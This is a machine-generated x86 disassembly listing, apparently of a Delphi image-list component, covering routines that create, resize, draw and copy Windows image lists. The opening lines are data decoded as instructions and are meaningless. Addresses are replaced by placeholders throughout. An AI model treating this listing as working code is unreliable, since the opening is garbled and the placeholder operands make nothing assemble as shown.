mov [ ebx + ebx * 8 + 0x5e80f74 ] 0x99
sti
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
or al 0x29
inc ecx
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 4 ] ch
outsb
je r-xdata
mov eax eax
xor [ ebx + 0xa030044 ] bl
push esp
dec ecx
insd
popad
push esp
jns r-xdata
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0x9b30c08b
inc esp
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x6d ]
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ ebx * 4 - 0x549fffbc ] dh
inc esp
add al ch
scasb [ edi ]
inc esp
add [ eax + 0x7c0044aa ] ah
sahf
inc ecx
add [ eax - 0x63 ] cl
inc ecx
add [ esi + ebx * 4 - 0x607bffbf ] cl
inc ecx
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esp + ebx * 4 - 0x596bffbc ] dl
inc esp
add [ eax - 0x63ffbb63 ] ah
mov bl 0x44
add [ eax ] ch
mov ah 0x44
add [ eax + 0x10044ac ] ah
add bh ch
push [ eax + 0x100044ac ]
push esp
inc ebx
jne r-xdata
add [ esp + esi - 0x650fffc0 ] ch
inc ecx
add [ esp + esi + 0x34a80040 ] dh
imul esi [ ebp + ecx * 2 + 0x61 ] 0x49076b73
insd
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ebx * 4 ] ch
inc esp
add [ edi ] al
imul esi [ ecx + ecx * 2 + 0x6d ] 0x6656761
sub_449c94
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419a2c
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_449ce0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_419a2c
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_449d34
push ebx
push esi
push edi
call sub_4035e4
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_41402c
mov edx eax
mov eax edi
call sub_44ad00
mov eax [ edi + 0x50 ]
call sub_403258
mov eax edi
call sub_44a090
mov eax [ edi + 0x4c ]
call sub_403258
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419a78
test bl bl
jle r-xdata
call sub_403258
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035cc
sub_449da0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_449e4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44ac88
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_449e6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449e54
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_449e6c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_449f0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_422ff4
mov eax ebx
call sub_422474
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41d5e4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412b10
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_422474
pop edx
call sub_41d988
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449f14
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_449f30
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_449e6c
pop ecx
pop edx
pop ebx
retn
sub_449f68
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_449e58
test al al
je r-xdata
mov eax esi
call sub_44a628
mov eax esi
call sub_449e6c
mov eax esi
mov si 0xffef
call sub_403454
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_449fac
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_449e58
test al al
je r-xdata
mov eax esi
call sub_44a628
mov eax esi
call sub_449e6c
mov eax esi
mov si 0xffef
call sub_403454
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_449ff0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44a090
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_449f30
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403454
sub_44a03c
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44ac10
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_4224e0
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a090
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_449e58
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403454
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44a02c
push eax
call ImageList_Destroy
sub_44a0c8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44a15b
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_449e58
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a162
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov edx eax
mov eax ebx
call sub_44a634
sub_44a168
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44a217
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44a1fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_449e60
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a03c
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a03c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a201
mov eax [ ebp - 0x10 ]
call sub_403258
retn
sub_44a234
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44a333
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a03c
push eax
mov eax [ ebp - 0x4 ]
call sub_44a02c
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a33a
mov eax [ ebp - 0xc ]
call sub_403258
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44a2f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_423398
mov eax [ ebp - 0x4 ]
call sub_449e60
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44a01c
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a03c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403258
retn
sub_44a350
push ebx
mov ebx eax
mov eax ebx
call sub_449e58
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44a02c
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44a374
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44a58b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_449e58
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a592
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fcc
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44ac10
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a234
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
xor eax eax
push ebp
push sub_44a53c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44a51c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44a4ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_423244
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_422474
call sub_41dd2c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44a02c
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_422474
call sub_41dd2c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44a02c
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_44a02c
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a506
mov eax [ ebp - 0x10 ]
call sub_403258
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
sub_44a59c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44a61b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44a350
cmp esi eax
jl r-xdata
mov eax ebx
call sub_449e58
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
mov eax ebx
mov si 0xffef
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a622
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
push esi
mov eax ebx
call sub_44a02c
push eax
call ImageList_Remove
sub_44a634
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449e58
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_449c54
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403454
pop esi
pop ebx
retn
sub_44a66c
push ebx
mov ebx eax
mov eax ebx
call sub_449e58
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44a02c
push eax
call ImageList_GetBkColor
call sub_449c74
pop ebx
retn
sub_44a694
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_449e58
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_449c54
push eax
mov eax ebx
call sub_44a66c
call sub_449c54
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41dd2c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44a02c
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_422474
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d5e4
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_412b10
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_422474
pop edx
call sub_41d988
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_422474
call sub_41dd2c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44a02c
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_412b10
mov eax [ ebx + 0x54 ]
call sub_422474
call sub_41dd2c
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41d5e4
mov eax edi
call sub_41dd2c
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41d5e4
mov eax edi
call sub_41dd2c
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_423244
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_44a868
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_44a88c
pop ebx
pop ebp
retn 0xc
sub_44a88c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_449e58
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44a8d8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412b10
mov eax [ ebp - 0x4 ]
call sub_44b56c
xor eax eax
push ebp
push sub_44aa71
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44aa54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44aa37
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_423244
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44aa3e
mov eax [ ebp - 0x10 ]
call sub_403258
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_422474
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41d988
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41dd2c
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_422474
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d988
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41dd2c
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44a168
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44aa80
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44a02c
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_44a8d8
sub_44aaa0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
call sub_44a090
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414500
mov eax ebx
call sub_44a628
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44ac88
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44a02c
mov edx eax
mov eax ebx
call sub_449f30
mov eax ebx
call sub_449e58
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44a02c
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_449e60
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44a02c
push eax
call ImageList_GetBkColor
call sub_449c74
mov edx eax
mov eax ebx
call sub_44a634
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44aa80
jmp r-xdata
sub_44ab60
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4145e4
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44ac88
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_44a628
mov eax esi
call sub_44a02c
mov edx eax
mov eax ebx
call sub_449f30
mov eax ebx
call sub_449e58
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44a02c
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_449e60
jmp r-xdata
mov eax esi
call sub_44a02c
push eax
call ImageList_GetBkColor
call sub_449c74
mov edx eax
mov eax ebx
call sub_44a634
mov edx esi
mov eax ebx
call sub_44aa80
pop esi
pop ebx
retn
sub_44ac10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44ac7c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ac83
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44acb0
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_413f44
mov si 0xffff
call sub_403454
inc ebp
dec edi
jne r-xdata
sub_44ad00
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413e34
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413f44
cmp ebp eax
jne r-xdata
sub_44ad58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407ca8
test al al
jne r-xdata
